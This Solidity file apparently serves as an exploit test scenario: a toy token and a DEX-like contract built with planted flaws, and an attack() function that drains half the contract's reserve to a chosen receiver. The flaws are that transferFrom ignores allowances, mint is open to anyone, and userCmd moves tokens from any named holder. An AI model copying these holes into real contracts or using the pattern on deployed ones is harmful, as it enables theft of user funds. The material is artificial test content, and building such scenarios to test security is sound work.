pragma solidity ^0.8.20;
contract CrocAsset { mapping(address=>uint256) public balanceOf; mapping(address=>mapping(address=>uint256)) public allowance; function approve(address a,uint256 n) external returns(bool){allowance[msg.sender][a]=n;return true;} function transferFrom(address f,address t,uint256 n) external returns(bool){require(balanceOf[f]>=n);balanceOf[f]-=n;balanceOf[t]+=n;return true;} function mint(address a,uint256 n) external{balanceOf[a]+=n;} function transfer(address t,uint256 n) external returns(bool){require(balanceOf[msg.sender]>=n);balanceOf[msg.sender]-=n;balanceOf[t]+=n;return true;} }
contract CrocSwapDex { CrocAsset public immutable asset; uint256 public liquidity; address public immutable admin; constructor(CrocAsset a){asset=a;admin=msg.sender;} function userCmd(address holder,uint256 n,address receiver) external {asset.transferFrom(holder,address(this),n); asset.transfer(receiver,n); liquidity+=n;} }
contract Scenario { CrocAsset public asset; CrocSwapDex public dex; address public victim; uint256 public constant SEED=1000000 ether; constructor(){asset=new CrocAsset();dex=new CrocSwapDex(asset);victim=address(dex);asset.mint(victim,SEED);asset.mint(address(this),SEED);} function attack(address receiver) external{dex.userCmd(victim,SEED/2,receiver);} function reserveBalance() external view returns(uint256){return asset.balanceOf(victim);} function attackerBalance(address a) external view returns(uint256){return asset.balanceOf(a);} function assetAddress() external view returns(address){return address(asset);} }
